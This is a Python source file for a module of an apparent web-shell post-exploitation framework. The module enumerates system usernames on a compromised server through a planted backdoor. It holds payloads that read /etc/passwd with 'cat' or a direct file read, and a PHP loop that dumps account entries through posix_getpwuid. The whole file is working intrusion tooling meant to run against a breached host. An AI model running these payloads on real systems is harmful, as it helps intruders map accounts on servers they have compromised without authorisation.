'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException

classname = 'Users'
    
class Users(Module):
    """Enumerate system usernames using different techniques
    :system.users
    """
    
    vectors = { 
               'shell.sh' : { "cat"       : "cat %s"
                },
               
               'shell.php' : { 
                              "posix_getpwuid" : "for($n=0; $n<1000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }",
                              },
               'file.read' : {
                              "file.read" : "%s"
                              }
    
    }
    

    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.infos = {}
        
                
    def run(self):
        
        for interpreter in self.vectors:
            for vector in self.vectors[interpreter]:
                if interpreter in self.modhandler.loaded_shells or interpreter == 'file.read':
                    payload = self.vectors[interpreter][vector] 
                    
                    if self.vectors[interpreter][vector].count('%s') == 1:
                        payload = payload % ('/etc/passwd')
                        
                    response = self.modhandler.load(interpreter).run(payload)
                    if response:
                        print "[system.users] User enumerated using method '%s'" % vector
                        return response

        raise ModuleException("system.users",  "User enumeration failed")
        


    
    
    